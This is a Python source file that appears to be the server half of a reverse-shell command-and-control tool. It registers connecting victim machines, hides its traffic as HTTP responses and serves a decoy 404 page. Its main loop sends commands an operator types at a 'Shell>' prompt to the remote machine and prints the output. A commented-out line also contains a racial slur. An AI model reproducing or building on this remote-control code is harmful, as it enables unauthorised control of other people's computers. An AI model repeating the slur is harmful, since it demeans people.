import socket
from Database import Database
from HttpResponse import HttpResponse
from HttpRequest import HttpRequest
import time


class Handler:
    @staticmethod
    def handle_unknown_source(client_sock):
        """
        This function sends to client rendered HTML page
        :param client_sock: socket for sending page
        :type client_sock: socket
        :return: None
        """
        content = HttpResponse.load_html_file('resources/index.html')
        response = HttpResponse.generate_response(404, content)
        client_sock.send(response.encode())

    @staticmethod
    def handle_shell_connection(client_sock, addr):
        """
        This function check if this is first time connection and handling it
        :param client_sock: socket of client
        :type client_sock: socket
        :param addr: ip address and port
        :type addr: tuple
        :return: None
        """
        # response = HttpResponse.generate_response(200, "I LIKE NIGGERS!")
        # client_sock.send(response.encode())
        if Database.computer_exist(addr[0]):
            Database.client_lock.acquire()
            Database.connected_clients.append(tuple((addr, client_sock)))
            Database.client_lock.release()
        else:
            # TODO: Not existing computer in database
            pass
        Handler.handle_reverse_shell(client_sock)

    @staticmethod
    def handle_reverse_shell(client_sock):
        while True:

            command = input("Shell> ")
            response = HttpResponse.generate_response(200, command)
            client_sock.send(response.encode())
            data = client_sock.recv(4098).decode()
            print(data)
            data = client_sock.recv(4098).decode()
            print(data)
            data = client_sock.recv(4098).decode()
            print(data)
